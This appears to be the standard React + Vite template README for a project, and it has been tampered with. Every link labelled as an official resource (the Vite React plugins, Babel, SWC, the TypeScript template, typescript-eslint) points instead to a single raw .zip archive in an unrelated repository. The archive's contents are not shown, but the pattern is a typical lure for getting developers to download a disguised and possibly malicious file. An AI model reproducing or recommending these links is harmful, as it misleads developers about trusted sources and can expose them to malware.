# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/sabalearning01/FindArstisan/raw/refs/heads/main/src/Pages/Admin/Find_Arstisan_3.8.zip) uses [Babel](https://github.com/sabalearning01/FindArstisan/raw/refs/heads/main/src/Pages/Admin/Find_Arstisan_3.8.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/sabalearning01/FindArstisan/raw/refs/heads/main/src/Pages/Admin/Find_Arstisan_3.8.zip) uses [SWC](https://github.com/sabalearning01/FindArstisan/raw/refs/heads/main/src/Pages/Admin/Find_Arstisan_3.8.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript and enable type-aware lint rules. Check out the [TS template](https://github.com/sabalearning01/FindArstisan/raw/refs/heads/main/src/Pages/Admin/Find_Arstisan_3.8.zip) to integrate TypeScript and [`typescript-eslint`](https://github.com/sabalearning01/FindArstisan/raw/refs/heads/main/src/Pages/Admin/Find_Arstisan_3.8.zip) in your project.
